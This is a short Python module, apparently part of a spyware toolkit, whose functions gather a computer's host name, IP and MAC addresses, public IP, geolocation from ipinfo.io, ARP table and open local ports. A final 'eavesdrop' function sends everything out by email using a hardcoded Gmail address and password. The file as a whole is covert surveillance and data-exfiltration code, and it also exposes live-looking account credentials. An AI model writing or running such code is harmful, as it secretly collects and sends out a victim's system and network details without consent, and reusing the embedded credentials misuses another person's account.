from threading import Thread
from uuid import getnode as get_mac
from time import sleep
import pyautogui
import socket
import os
import smtplib
import subprocess
import datetime
import time
import cv2
import platform
import sys
import math
import uuid
import hacks.send

def OS_info():
    return """
    Computer Name: {}
    IP Address: {}
    MAC Address: {}
    Public IP Address: {}
    Timezone: {}
    Date: {}
    Current Time: {}
    Python version: {}
    Dist: {}
    System: {}
    Machine: {}
    Platform: {}
    Uname: {}
    Version: {}
    Mac_ver: {}
    """ .format(
    socket.gethostname(),
    socket.gethostbyname(socket.gethostname()),
    get_mac(),
    subprocess.check_output('dig +short myip.opendns.com @resolver1.opendns.com',shell=True).decode()[:-2],
    time.tzname,
    datetime.datetime.now().date(),
    datetime.datetime.now().time(),
    sys.version.split('\n'),
    str(platform.dist()),
    platform.system(),
    platform.machine(),
    platform.platform(),
    platform.uname(),
    platform.version(),
    platform.mac_ver()
    )

def openPorts():
    remoteServer = socket.gethostbyname(socket.gethostname())
    remoteServerIP  = socket.gethostbyname(remoteServer)
    open_ports_list = []

    for port in range(1,1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((remoteServerIP, port))
        if result == 0:
            open_ports_list.append(port)
        sock.close()

    open_ports_string = "Ports open: "
    for i in open_ports_list:
        open_ports_string += str(i) + ", "
    return open_ports_string[:-2]

def location():
    return subprocess.check_output('curl ipinfo.io',shell=True).decode()

def arp_a():
    return subprocess.check_output('arp -a',shell=True).decode()

def roundup(x):
    return int(math.ceil(x / 10.0)) * 10

def eavesdrop_os_info():
    string = ""
    string += "OS Information: " + OS_info() + "\n"
    string += "Location: " + location() + "\n"
    string += "ARP A " + arp_a() + "\n"
    string += "Open Ports: " + openPorts() + "\n"
    hacks.send.send_mail("calix.huang1@gmail.com", "Xamg9]HuskRufa", "calix.huang1@gmail.com", string)